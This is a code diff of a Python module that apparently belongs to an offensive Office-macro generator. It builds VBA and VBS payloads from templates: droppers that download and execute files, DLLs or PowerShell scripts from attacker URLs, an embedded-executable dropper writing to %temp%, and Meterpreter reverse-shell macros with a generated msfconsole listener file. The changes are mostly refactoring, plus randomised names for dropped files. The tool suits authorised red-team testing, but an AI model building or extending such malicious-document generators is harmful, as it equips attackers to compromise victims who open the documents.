@@ -10,10 +10,12 @@ import vbLib.Meterpreter
 import vbLib.WebMeter
 import vbLib.WscriptExec
 import vbLib.ExecuteCMDAsync
+import vbLib.ExecuteCMDSync
 import vbLib.templates
 import vbLib.WmiExec
 from common.utils import MSTypes
 from collections import OrderedDict
+from common import  utils
 
 
 
@@ -44,16 +46,18 @@ class TemplateToVba(MpModule):
     
     def _processCmdTemplate(self):
         """ cmd execute template builder """
-        paramDict = OrderedDict([("cmdline",None)])      
+        paramDict = OrderedDict([("Command line",None)]) 
         self.fillInputParams(paramDict)
+        self.mpSession.dosCommand =  paramDict["Command line"]     
         
         # add execution functions
-        self.addVBALib(vbLib.WscriptExec)
-        self.addVBALib(vbLib.WmiExec )
-        self.addVBALib(vbLib.ExecuteCMDAsync )
+        self.addVBLib(vbLib.WscriptExec)
+        self.addVBLib(vbLib.WmiExec )
+        self.addVBLib(vbLib.ExecuteCMDAsync )
         
         content = vbLib.templates.CMD
-        content = content.replace("<<<CMD>>>", paramDict["cmdline"])
+        if self.mpSession.mpType == "Community":
+            content = content.replace("<<<CMDLINE>>>", self.mpSession.dosCommand)
         vbaFile = self.addVBAModule(content)
         logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
 
@@ -70,9 +74,9 @@ class TemplateToVba(MpModule):
             paramDict[downloadPathKey] = paramDict[downloadPathKey] + '\n    downloadPath = Environ("TEMP") & "\\" & downloadPath'
 
         # Add required functions
-        self.addVBALib(vbLib.WscriptExec)
-        self.addVBALib(vbLib.WmiExec )
-        self.addVBALib(vbLib.ExecuteCMDAsync )
+        self.addVBLib(vbLib.WscriptExec)
+        self.addVBLib(vbLib.WmiExec )
+        self.addVBLib(vbLib.ExecuteCMDAsync )
         
 
         content = vbLib.templates.DROPPER
@@ -81,7 +85,7 @@ class TemplateToVba(MpModule):
         # generate random file name
         vbaFile = self.addVBAModule(content)
         
-        logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
+        logging.debug("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
         logging.info("   [-] OK!")
     
     
@@ -98,9 +102,9 @@ class TemplateToVba(MpModule):
             paramDict[downloadPathKey] = paramDict[downloadPathKey] + '\n    downloadPath = Environ("TEMP") & "\\" & downloadPath'
             
         # Add required functions
-        self.addVBALib(vbLib.WscriptExec)
-        self.addVBALib(vbLib.WmiExec )
-        self.addVBALib(vbLib.ExecuteCMDAsync )
+        self.addVBLib(vbLib.WscriptExec)
+        self.addVBLib(vbLib.WmiExec )
+        self.addVBLib(vbLib.ExecuteCMDAsync )
 
         content = vbLib.templates.DROPPER2
         content = content.replace("<<<URL>>>", paramDict["target_url"])
@@ -108,7 +112,7 @@ class TemplateToVba(MpModule):
         # generate random file name
         vbaFile = self.addVBAModule(content)
         
-        logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
+        logging.debug("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
         logging.info("   [-] OK!")
         
     
@@ -119,34 +123,35 @@ class TemplateToVba(MpModule):
         self.fillInputParams(paramDict)
 
         # Add required functions
-        self.addVBALib(vbLib.WscriptExec)
-        self.addVBALib(vbLib.WmiExec )
-        self.addVBALib(vbLib.ExecuteCMDAsync )
+        self.addVBLib(vbLib.WscriptExec)
+        self.addVBLib(vbLib.WmiExec )
+        self.addVBLib(vbLib.ExecuteCMDAsync )
 
         content = vbLib.templates.DROPPER_PS
         content = content.replace("<<<POWERSHELL_SCRIPT_URL>>>", paramDict["powershell_script_url"])
         # generate random file name
         vbaFile = self.addVBAModule(content)
         
-        logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
+        logging.debug("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
         logging.info("   [-] OK!")
     
     
     def _processEmbedExeTemplate(self):
-        # Get parameters      
-        paramDict = OrderedDict([("extract_path", None)])  
-        self.fillInputParams(paramDict)
-        logging.info("   [-] Output path when file is extracted: %s" % paramDict["extract_path"])
+        """ Drop and execute embedded file """
+        # generate random file name
+        fileName = utils.randomAlpha(7)  + os.path.splitext(self.mpSession.embeddedFilePath)[1]
+       
+        logging.info("   [-] File extraction path: %%temp%%\\%s" % fileName)
 
         # Add required functions
-        self.addVBALib(vbLib.WscriptExec)
-        self.addVBALib(vbLib.WmiExec )
-        self.addVBALib(vbLib.ExecuteCMDAsync )
-
+        self.addVBLib(vbLib.WscriptExec)
+        self.addVBLib(vbLib.WmiExec )
+        self.addVBLib(vbLib.ExecuteCMDAsync )
         content = vbLib.templates.EMBED_EXE
-        content = content.replace("<<<OUT_FILE>>>", paramDict["extract_path"])
+        content = content.replace("<<<FILE_NAME>>>", fileName)
         vbaFile = self.addVBAModule(content)
-        logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
+        
+        logging.debug("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
         logging.info("   [-] OK!")
     
     
@@ -162,14 +167,14 @@ class TemplateToVba(MpModule):
             content = content.replace("<<<DLL_URL>>>", dllUrl)
             content = content.replace("<<<DLL_FUNCTION>>>", dllFct)
             vbaFile = self.addVBAModule(content)
-            logging.info("   [-] Template %s VBS generated in %s" % (self.template, vbaFile))
+            logging.debug("   [-] Template %s VBS generated in %s" % (self.template, vbaFile))
             
         else:
             # generate main module 
             content = vbLib.templates.DROPPER_DLL2
             content = content.replace("<<<DLL_FUNCTION>>>", dllFct)
             invokerModule = self.addVBAModule(content)
-            logging.info("   [-] Template %s VBA generated in %s" % (self.template, invokerModule)) 
+            logging.debug("   [-] Template %s VBA generated in %s" % (self.template, invokerModule)) 
             
             # second module
             content = vbLib.templates.DROPPER_DLL1
@@ -189,7 +194,7 @@ class TemplateToVba(MpModule):
             content = content.replace("<<<APPLICATION>>>", msApp)
             content = content.replace("<<<MODULE_2>>>", os.path.splitext(os.path.basename(invokerModule))[0])
             vbaFile = self.addVBAModule(content)
-            logging.info("   [-] Second part of Template %s VBA generated in %s" % (self.template, vbaFile))
+            logging.debug("   [-] Second part of Template %s VBA generated in %s" % (self.template, vbaFile))
 
         logging.info("   [-] OK!")
     
@@ -200,19 +205,19 @@ class TemplateToVba(MpModule):
         self.fillInputParams(paramDict)
             
         #logging.info("   [-] Dll will be dropped at: %s" % extractedFilePath)
-        if self.outputFileType in [ MSTypes.HTA, MSTypes.VBS, MSTypes.WSF, MSTypes.SCT]:
+        if self.outputFileType in [ MSTypes.VBSCRIPTS_FORMATS ]:
             # for VBS based file
             content = vbLib.templates.EMBED_DLL_VBS
             content = content.replace("<<<DLL_FUNCTION>>>", paramDict["Dll_Function"])
             vbaFile = self.addVBAModule(content)
-            logging.info("   [-] Template %s VBS generated in %s" % (self.template, vbaFile))
+            logging.debug("   [-] Template %s VBS generated in %s" % (self.template, vbaFile))
         else:
             # for VBA based files
             # generate main module 
             content = vbLib.templates.DROPPER_DLL2
             content = content.replace("<<<DLL_FUNCTION>>>", paramDict["Dll_Function"])
             invokerModule = self.addVBAModule(content)
-            logging.info("   [-] Template %s VBA generated in %s" % (self.template, invokerModule)) 
+            logging.debug("   [-] Template %s VBA generated in %s" % (self.template, invokerModule)) 
             
             # second module
             content = vbLib.templates.EMBED_DLL_VBA
@@ -231,7 +236,7 @@ class TemplateToVba(MpModule):
             content = content.replace("<<<APPLICATION>>>", msApp)
             content = content.replace("<<<MODULE_2>>>", os.path.splitext(os.path.basename(invokerModule))[0])
             vbaFile = self.addVBAModule(content)
-            logging.info("   [-] Second part of Template %s VBA generated in %s" % (self.template, vbaFile))
+            logging.debug("   [-] Second part of Template %s VBA generated in %s" % (self.template, vbaFile))
             
         logging.info("   [-] OK!")
     
@@ -249,7 +254,7 @@ class TemplateToVba(MpModule):
         else:
             content = content + vbLib.Meterpreter.VBA
         vbaFile = self.addVBAModule(content)
-        logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
+        logging.debug("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
         rc_content = vbLib.templates.METERPRETER_RC
         rc_content = rc_content.replace("<<<LHOST>>>", paramDict["rhost"])
         rc_content = rc_content.replace("<<<LPORT>>>", paramDict["rport"])
@@ -260,7 +265,7 @@ class TemplateToVba(MpModule):
         f.close()
         logging.info("   [-] Meterpreter resource file generated in %s" % (rcFilePath)) 
         logging.info("   [-] Execute lisetener with 'msfconsole -r %s'" % (rcFilePath)) 
-        
+        logging.info("   [-] OK!")
         
         
  
@@ -277,7 +282,7 @@ class TemplateToVba(MpModule):
         content = content + vbLib.WebMeter.VBA
 
         vbaFile = self.addVBAModule(content)
-        logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
+        logging.debug("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
         
         rc_content = vbLib.templates.WEBMETER_RC
         rc_content = rc_content.replace("<<<LHOST>>>", paramDict["rhost"])
@@ -289,7 +294,7 @@ class TemplateToVba(MpModule):
         f.close()
         logging.info("   [-] Meterpreter resource file generated in %s" % (rcFilePath)) 
         logging.info("   [-] Execute lisetener with 'msfconsole -r %s'" % (rcFilePath)) 
-        
+        logging.info("   [-] OK!")
         
  
     def _generation(self):
@@ -301,23 +306,20 @@ class TemplateToVba(MpModule):
         elif self.template == "DROPPER":
             self._processDropperTemplate()
             return
-        elif self.template == "DROPPER2":
-            self._processDropper2Template()
-            return
         elif self.template == "DROPPER_PS":
             self._processPowershellDropperTemplate()
             return
         elif self.template == "METERPRETER":
             self._processMeterpreterTemplate()
             return
-        elif self.template == "WEBMETER":
-            self._processWebMeterTemplate()
-            return
+        #elif self.template == "WEBMETER":
+        #    self._processWebMeterTemplate()
+        #    return
         elif self.template == "CMD":
             self._processCmdTemplate()
             return
         elif self.template == "REMOTE_CMD":
-            self.addVBALib(vbLib.ExecuteCMDSync )
+            self.addVBLib(vbLib.ExecuteCMDSync )
             content = vbLib.templates.REMOTE_CMD
         elif self.template == "EMBED_EXE":
             self._processEmbedExeTemplate()
